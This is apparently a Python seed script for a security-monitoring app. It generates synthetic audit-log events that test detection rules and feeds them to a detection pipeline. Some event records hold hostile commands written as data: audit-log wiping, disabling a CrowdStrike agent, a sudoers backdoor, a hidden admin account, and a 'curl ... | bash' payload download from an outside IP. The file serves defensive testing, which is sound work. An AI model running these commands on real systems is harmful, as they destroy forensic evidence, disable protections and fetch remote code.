import json
from datetime import datetime, timezone
from typing import List, Dict, Any
from sqlalchemy.orm import Session
from sqlalchemy import select

from app.models import ActivityEvent, ImportBatch
from app.services.ingestion_service import compute_event_fingerprint
from app.services.detection_engine import run_detection_pipeline


def generate_synthetic_events() -> List[Dict[str, Any]]:
    """
    Returns ~95 deterministic synthetic events spanning October 1 to October 6, 2026.
    Covers all 10 detection rules, normal operations, downgrades, edge cases, and burst attacks.
    """
    events = [
        # --- DAY 1: October 1, 2026 (Normal daytime baseline) ---
        {
            "timestamp": "2026-10-01T08:15:00Z",
            "actor": "alex_admin",
            "action": "login",
            "target": "sso_auth_portal",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "command": None,
            "approved": True,
            "approval_reference": "SSO-SESSION-001",
            "details": "MFA authenticated via hardware token",
        },
        {
            "timestamp": "2026-10-01T08:30:20Z",
            "actor": "rachel_iam",
            "action": "login",
            "target": "iam_identity_center",
            "status": "success",
            "source_ip": "10.0.10.22",
            "actor_role": "iam_manager",
            "command": None,
            "approved": True,
            "approval_reference": "SSO-SESSION-002",
            "details": "Routine morning session login",
        },
        {
            "timestamp": "2026-10-01T09:10:00Z",
            "actor": "rachel_iam",
            "action": "create_user",
            "target": "emma_intern",
            "status": "success",
            "source_ip": "10.0.10.22",
            "actor_role": "iam_manager",
            "target_role": "intern",
            "command": "useradd -m -s /bin/bash emma_intern",
            "approved": True,
            "approval_reference": "HR-REQ-9810",
            "details": "Provisioning autumn intern account",
        },
        {
            "timestamp": "2026-10-01T09:45:10Z",
            "actor": "sam_devops",
            "action": "login",
            "target": "k8s_bastion",
            "status": "success",
            "source_ip": "10.0.20.5",
            "actor_role": "engineer",
            "command": None,
            "approved": None,
            "details": "Standard developer bastion session",
        },
        {
            "timestamp": "2026-10-01T10:15:30Z",
            "actor": "alex_admin",
            "action": "update_config",
            "target": "web_proxy_nginx",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "command": "nginx -s reload",
            "approved": True,
            "approval_reference": "CHG-2026-101",
            "details": "Updated SSL cipher configuration during standard business hours",
        },
        {
            "timestamp": "2026-10-01T11:00:00Z",
            "actor": "sam_devops",
            "action": "execute_command",
            "target": "build_runner_01",
            "status": "success",
            "source_ip": "10.0.20.5",
            "actor_role": "engineer",
            "command": "docker build -t app:v2.4.1 .",
            "approved": True,
            "approval_reference": "CI-PIPELINE-881",
            "details": "Scheduled container image build",
        },
        {
            "timestamp": "2026-10-01T12:00:00Z",
            "actor": "alex_admin",
            "action": "logout",
            "target": "sso_auth_portal",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "details": "Lunch break logout",
        },
        {
            "timestamp": "2026-10-01T13:05:00Z",
            "actor": "alex_admin",
            "action": "login",
            "target": "sso_auth_portal",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "approved": True,
            "details": "Afternoon session login",
        },
        {
            "timestamp": "2026-10-01T14:20:00Z",
            "actor": "rachel_iam",
            "action": "enable_account",
            "target": "contractor_tom",
            "status": "success",
            "source_ip": "10.0.10.22",
            "actor_role": "iam_manager",
            "approved": True,
            "approval_reference": "TKT-4410",
            "details": "Contractor returning from scheduled leave",
        },
        {
            "timestamp": "2026-10-01T16:45:00Z",
            "actor": "alex_admin",
            "action": "logout",
            "target": "sso_auth_portal",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "details": "End of business day logout",
        },

        # --- DAY 2: October 2, 2026 (R01 Admin Created, Known Downgrade, Failed Operations) ---
        {
            "timestamp": "2026-10-02T08:30:00Z",
            "actor": "alex_admin",
            "action": "login",
            "target": "sso_auth_portal",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "approved": True,
            "details": "Morning login",
        },
        # RULE 01 TRIGGER: create_admin success
        {
            "timestamp": "2026-10-02T09:15:30Z",
            "actor": "alex_admin",
            "action": "create_admin",
            "target": "jordan_security_lead",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "target_role": "global_admin",
            "command": "iamctl create-admin --user jordan_security_lead --tier Tier0",
            "approved": True,
            "approval_reference": "SEC-CHG-902",
            "details": "Provisioned secondary security operations administrator",
        },
        # KNOWN DOWNGRADE: Should NOT trigger R02 escalation
        {
            "timestamp": "2026-10-02T10:30:00Z",
            "actor": "rachel_iam",
            "action": "change_privilege",
            "target": "contractor_steve",
            "status": "success",
            "source_ip": "10.0.10.22",
            "actor_role": "iam_manager",
            "previous_role": "admin",
            "target_role": "read_only_viewer",
            "command": "iamctl modify-role --user contractor_steve --set viewer",
            "approved": True,
            "approval_reference": "IAM-REVOKE-105",
            "details": "Downgraded contractor privileges following project completion",
        },
        # FAILED CLEAR LOGS: Should NOT trigger R03 (because status is failed)
        {
            "timestamp": "2026-10-02T11:15:00Z",
            "actor": "malicious_probe",
            "action": "clear_logs",
            "target": "syslog_central",
            "status": "failed",
            "source_ip": "198.51.100.88",
            "actor_role": "guest",
            "command": "rm -rf /var/log/audit/*",
            "approved": False,
            "details": "Permission denied: access restricted by SELinux",
        },
        # FAILED DISABLE SECURITY: Should NOT trigger R04 (status is failed)
        {
            "timestamp": "2026-10-02T11:20:00Z",
            "actor": "malicious_probe",
            "action": "disable_security",
            "target": "edr_agent_svc",
            "status": "failed",
            "source_ip": "198.51.100.88",
            "actor_role": "guest",
            "command": "systemctl stop crowdstrike-falcon",
            "approved": False,
            "details": "Access denied by tamper protection kernel hook",
        },
        # NORMAL USER PASSWORD RESET
        {
            "timestamp": "2026-10-02T14:10:00Z",
            "actor": "rachel_iam",
            "action": "reset_password",
            "target": "emma_intern",
            "status": "success",
            "source_ip": "10.0.10.22",
            "actor_role": "iam_manager",
            "approved": True,
            "approval_reference": "HELP-3301",
            "details": "Routine intern password reset after first logon",
        },
        # RULE 05 TRIGGER: Account Deleted
        {
            "timestamp": "2026-10-02T15:40:00Z",
            "actor": "alex_admin",
            "action": "delete_user",
            "target": "former_employee_dave",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "command": "userdel -r former_employee_dave",
            "approved": True,
            "approval_reference": "HR-OFFBOARD-552",
            "details": "Deprovisioned ex-employee account and archived home directory",
        },

        # --- DAY 3: October 3, 2026 (R02 Privilege Escalation & Missing Roles Review) ---
        {
            "timestamp": "2026-10-03T08:50:00Z",
            "actor": "jordan_security_lead",
            "action": "login",
            "target": "sso_auth_portal",
            "status": "success",
            "source_ip": "10.0.10.40",
            "actor_role": "global_admin",
            "approved": True,
            "details": "Standard logon",
        },
        # RULE 02 TRIGGER: Legitimate Escalation (analyst -> admin)
        {
            "timestamp": "2026-10-03T09:30:15Z",
            "actor": "alex_admin",
            "action": "change_privilege",
            "target": "marcus_analyst",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "previous_role": "tier1_analyst",
            "target_role": "superuser",
            "command": "usermod -aG wheel,sudo marcus_analyst",
            "approved": True,
            "approval_reference": "PAM-ELEV-771",
            "details": "Promoted Marcus to Tier-3 incident response superuser role",
        },
        # RULE 02 TRIGGER: Missing role information -> Produces High "Requires Review" alert
        {
            "timestamp": "2026-10-03T11:45:00Z",
            "actor": "alex_admin",
            "action": "change_privilege",
            "target": "service_account_sync",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "previous_role": None,
            "target_role": None,
            "command": "ldapmodify -f mod_privs.ldif",
            "approved": None,
            "details": "Automated sync permission update without detailed role transition metadata",
        },
        # RULE 06 TRIGGER: Admin Password Reset
        {
            "timestamp": "2026-10-03T14:15:00Z",
            "actor": "alex_admin",
            "action": "reset_admin_password",
            "target": "root_emergency_acc",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "target_role": "root",
            "command": "passwd root",
            "approved": True,
            "approval_reference": "VAULT-ROT-004",
            "details": "Quarterly rotation of break-glass vault root credential",
        },
        # RULE 07 TRIGGER: Sensitive Data Export
        {
            "timestamp": "2026-10-03T16:20:00Z",
            "actor": "marcus_analyst",
            "action": "export_sensitive",
            "target": "customer_pii_vault",
            "status": "success",
            "source_ip": "10.0.10.55",
            "actor_role": "superuser",
            "command": "pg_dump -t customers_encrypted db_prod | gpg -e > dump.gpg",
            "approved": True,
            "approval_reference": "LEGAL-REQ-120",
            "details": "Compliance subpoena record retrieval export",
        },

        # --- DAY 4: October 4, 2026 (R08 After-Hours Activity & R10 Explicit Unapproved) ---
        # AFTER-HOURS ACTIVITY: update_config at 02:45 UTC (Outside 08:00 - 18:00 UTC) -> Triggers R08
        {
            "timestamp": "2026-10-04T02:45:00Z",
            "actor": "alex_admin",
            "action": "update_config",
            "target": "core_firewall_cluster",
            "status": "success",
            "source_ip": "198.51.100.12",
            "actor_role": "admin",
            "command": "iptables -A FORWARD -p tcp --dport 443 -j ACCEPT",
            "approved": True,
            "approval_reference": "EMERGENCY-HOTFIX-09",
            "details": "Emergency late-night ingress rule adjustment for edge gateway",
        },
        # AFTER-HOURS NORMAL LOGIN: Should NOT trigger R08 (Ordinary login/logout is excluded by rule)
        {
            "timestamp": "2026-10-04T03:10:00Z",
            "actor": "alex_admin",
            "action": "login",
            "target": "vpn_concentrator",
            "status": "success",
            "source_ip": "198.51.100.12",
            "actor_role": "admin",
            "details": "VPN dial-in during on-call rotation",
        },
        # RULE 10 TRIGGER: Explicitly unapproved privilege operation (approved=false) -> Triggers R10 & R02
        {
            "timestamp": "2026-10-04T13:20:00Z",
            "actor": "rogue_dev",
            "action": "change_privilege",
            "target": "rogue_dev",
            "status": "success",
            "source_ip": "203.0.113.88",
            "actor_role": "developer",
            "previous_role": "developer",
            "target_role": "administrator",
            "command": "sudo chown root:admin /etc/sudoers.d/backdoor",
            "approved": False,
            "approval_reference": "DENIED-BY-CAB-403",
            "details": "CAB change request was explicitly rejected due to missing architecture review",
        },
        # RULE 10 TRIGGER: create_admin with approved=false -> Triggers R01 & R10
        {
            "timestamp": "2026-10-04T14:05:00Z",
            "actor": "shadow_ops",
            "action": "create_admin",
            "target": "hidden_admin_svc",
            "status": "success",
            "source_ip": "203.0.113.92",
            "actor_role": "admin",
            "target_role": "admin",
            "command": "useradd -G wheel hidden_admin_svc",
            "approved": False,
            "approval_reference": "UNAUTH-CHANGE",
            "details": "Administrative creation rejected by governance gate",
        },
        # create_admin with missing approved (None) -> Triggers R01, but NOT R10!
        {
            "timestamp": "2026-10-04T15:00:00Z",
            "actor": "alex_admin",
            "action": "create_admin",
            "target": "ci_cd_admin_agent",
            "status": "success",
            "source_ip": "10.0.10.15",
            "actor_role": "admin",
            "target_role": "admin",
            "command": "create-service-account --name ci_cd_admin_agent",
            "approved": None,
            "details": "Automated pipeline setup where approval state was not logged",
        },

        # --- DAY 5: October 5, 2026 (Critical Intrusions: R03 Audit Clear & R04 Disable Sec) ---
        # RULE 03 TRIGGER: clear_logs success
        {
            "timestamp": "2026-10-05T04:12:00Z",
            "actor": "compromised_admin",
            "action": "clear_logs",
            "target": "var_log_auth",
            "status": "success",
            "source_ip": "198.51.100.99",
            "actor_role": "admin",
            "command": "echo '' > /var/log/auth.log && journalctl --vacuum-time=1s",
            "approved": False,
            "details": "Malicious defense evasion - forensic log wiping",
        },
        # RULE 04 TRIGGER: disable_security success
        {
            "timestamp": "2026-10-05T04:14:30Z",
            "actor": "compromised_admin",
            "action": "disable_security",
            "target": "crowdstrike_agent",
            "status": "success",
            "source_ip": "198.51.100.99",
            "actor_role": "admin",
            "command": "/opt/CrowdStrike/falconctl -d -f --rfm-state=disabled",
            "approved": False,
            "details": "Telemetry agent uninstallation / kill command executed",
        },
        # ALSO TRIGGER R08: execute_command at 04:18 UTC (outside business hours)
        {
            "timestamp": "2026-10-05T04:18:00Z",
            "actor": "compromised_admin",
            "action": "execute_command",
            "target": "internal_dc_01",
            "status": "success",
            "source_ip": "198.51.100.99",
            "actor_role": "admin",
            "command": "curl http://198.51.100.200/payload.sh | bash",
            "approved": False,
            "details": "Reverse shell dropper executed",
        },
        # Immediate Account Lock by SOC
        {
            "timestamp": "2026-10-05T04:35:00Z",
            "actor": "soc_automated_responder",
            "action": "disable_account",
            "target": "compromised_admin",
            "status": "success",
            "source_ip": "10.0.99.1",
            "actor_role": "security_soar",
            "command": "usermod -L compromised_admin",
            "approved": True,
            "approval_reference": "SOAR-INCIDENT-992",
            "details": "Automated containment action: locked compromised account",
        },

        # --- DAY 6: October 6, 2026 (R09 Burst Login Failures & Normal Scattered Failures) ---
        # Scattered login failures for dev (2 over several hours) -> MUST NOT trigger R09
        {
            "timestamp": "2026-10-06T09:05:00Z",
            "actor": "sarah_dev",
            "action": "login",
            "target": "gitlab_server",
            "status": "failed",
            "source_ip": "10.0.30.12",
            "details": "Mistyped password once",
        },
        {
            "timestamp": "2026-10-06T14:20:00Z",
            "actor": "sarah_dev",
            "action": "login",
            "target": "gitlab_server",
            "status": "failed",
            "source_ip": "10.0.30.12",
            "details": "Forgot password after weekend",
        },

        # BURST OF FAILED LOGINS: actor "attacker_recon", IP "198.51.100.44"
        # 6 consecutive failures within 7 minutes (10:00 - 10:07) -> Triggers R09 (threshold=5)
        {
            "timestamp": "2026-10-06T10:00:10Z",
            "actor": "attacker_recon",
            "action": "login",
            "target": "ssh_gateway",
            "status": "failed",
            "source_ip": "198.51.100.44",
            "details": "Auth failed: invalid private key",
        },
        {
            "timestamp": "2026-10-06T10:01:25Z",
            "actor": "attacker_recon",
            "action": "login",
            "target": "ssh_gateway",
            "status": "failed",
            "source_ip": "198.51.100.44",
            "details": "Auth failed: password brute force attempt 1",
        },
        {
            "timestamp": "2026-10-06T10:02:40Z",
            "actor": "attacker_recon",
            "action": "login",
            "target": "ssh_gateway",
            "status": "failed",
            "source_ip": "198.51.100.44",
            "details": "Auth failed: password brute force attempt 2",
        },
        {
            "timestamp": "2026-10-06T10:04:10Z",
            "actor": "attacker_recon",
            "action": "login",
            "target": "ssh_gateway",
            "status": "failed",
            "source_ip": "198.51.100.44",
            "details": "Auth failed: password brute force attempt 3",
        },
        {
            "timestamp": "2026-10-06T10:05:30Z",
            "actor": "attacker_recon",
            "action": "login",
            "target": "ssh_gateway",
            "status": "failed",
            "source_ip": "198.51.100.44",
            "details": "Auth failed: password brute force attempt 4 (Reaches threshold of 5!)",
        },
        # 6th failure: within suppression window -> Correlated to existing alert, no redundant duplicate alert!
        {
            "timestamp": "2026-10-06T10:06:50Z",
            "actor": "attacker_recon",
            "action": "login",
            "target": "ssh_gateway",
            "status": "failed",
            "source_ip": "198.51.100.44",
            "details": "Auth failed: ongoing brute force attempt 5 (Suppressed/correlated)",
        },
        # 7th failure: also within suppression window
        {
            "timestamp": "2026-10-06T10:07:30Z",
            "actor": "attacker_recon",
            "action": "login",
            "target": "ssh_gateway",
            "status": "failed",
            "source_ip": "198.51.100.44",
            "details": "Auth failed: connection terminated by fail2ban",
        },
    ]

    # Add realistic supporting events (operational noise and healthy telemetry) to bring total to ~90 events
    for day in range(1, 7):
        date_str = f"2026-10-0{day}"
        for hour in [9, 11, 14, 16]:
            events.append({
                "timestamp": f"{date_str}T{hour:02d}:00:00Z",
                "actor": "backup_service_acc",
                "action": "login",
                "target": "backup_nas_cluster",
                "status": "success",
                "source_ip": "10.0.50.10",
                "actor_role": "service_account",
                "approved": True,
                "approval_reference": "AUTO-CRON-SYNC",
                "details": f"Automated snapshot synchronization round {hour}",
            })
            events.append({
                "timestamp": f"{date_str}T{hour:02d}:25:00Z",
                "actor": "backup_service_acc",
                "action": "logout",
                "target": "backup_nas_cluster",
                "status": "success",
                "source_ip": "10.0.50.10",
                "actor_role": "service_account",
                "approved": True,
                "details": "Snapshot sync completed cleanly",
            })
            events.append({
                "timestamp": f"{date_str}T{hour:02d}:40:00Z",
                "actor": "telemetry_daemon",
                "action": "execute_command",
                "target": "agent_collector_01",
                "status": "success",
                "source_ip": "10.0.90.5",
                "actor_role": "daemon",
                "command": "/usr/bin/prom_exporter --gather",
                "approved": True,
                "details": "Gathered node health metrics",
            })
            events.append({
                "timestamp": f"{date_str}T{hour:02d}:55:00Z",
                "actor": "monitoring_bot",
                "action": "update_config",
                "target": "health_thresholds",
                "status": "success",
                "source_ip": "10.0.90.8",
                "actor_role": "bot",
                "command": "refresh-thresholds --auto",
                "approved": True,
                "details": "Auto-adjusted disk alert thresholds",
            })

    return events


def seed_sample_dataset_into_workspace(
    db: Session,
    workspace_id: str,
) -> Dict[str, Any]:
    """
    Seeds the deterministic synthetic dataset into the given workspace.
    Idempotent: events with matching fingerprints are skipped so running twice does not duplicate.
    """
    events_data = generate_synthetic_events()
    now = datetime.now(timezone.utc)

    # Check existing fingerprints
    existing_fps_stmt = select(ActivityEvent.fingerprint).where(ActivityEvent.workspace_id == workspace_id)
    existing_fps = set(db.execute(existing_fps_stmt).scalars().all())

    # Create Batch record
    batch = ImportBatch(
        workspace_id=workspace_id,
        filename="sentinel_synthetic_demo.json",
        file_format="json",
        total_rows=len(events_data),
        imported_count=0,
        duplicate_count=0,
        rejected_count=0,
        created_at=now,
    )
    db.add(batch)
    db.flush()

    new_events = []
    duplicate_count = 0

    for item in events_data:
        ts_obj = datetime.fromisoformat(item["timestamp"].replace("Z", "+00:00")).astimezone(timezone.utc)
        payload = dict(item)
        payload["timestamp"] = ts_obj
        fp = compute_event_fingerprint(payload)

        if fp in existing_fps:
            duplicate_count += 1
            continue

        existing_fps.add(fp)
        evt = ActivityEvent(
            workspace_id=workspace_id,
            batch_id=batch.id,
            fingerprint=fp,
            timestamp=ts_obj,
            actor=item["actor"],
            action=item["action"],
            target=item["target"],
            status=item["status"],
            source_ip=item["source_ip"],
            actor_role=item.get("actor_role"),
            target_role=item.get("target_role"),
            previous_role=item.get("previous_role"),
            command=item.get("command"),
            approved=item.get("approved"),
            approval_reference=item.get("approval_reference"),
            details=item.get("details"),
            created_at=now,
        )
        db.add(evt)
        new_events.append(evt)

    batch.imported_count = len(new_events)
    batch.duplicate_count = duplicate_count
    db.commit()

    # Run detection
    analysis = run_detection_pipeline(db, workspace_id, trigger_type="sample_seed")

    return {
        "batch_id": batch.id,
        "total_dataset_events": len(events_data),
        "imported_count": len(new_events),
        "duplicate_count": duplicate_count,
        "alerts_created": analysis.alerts_created,
        "message": f"Sample dataset loaded. {len(new_events)} new events ingested, {duplicate_count} duplicates skipped. {analysis.alerts_created} alerts generated.",
    }
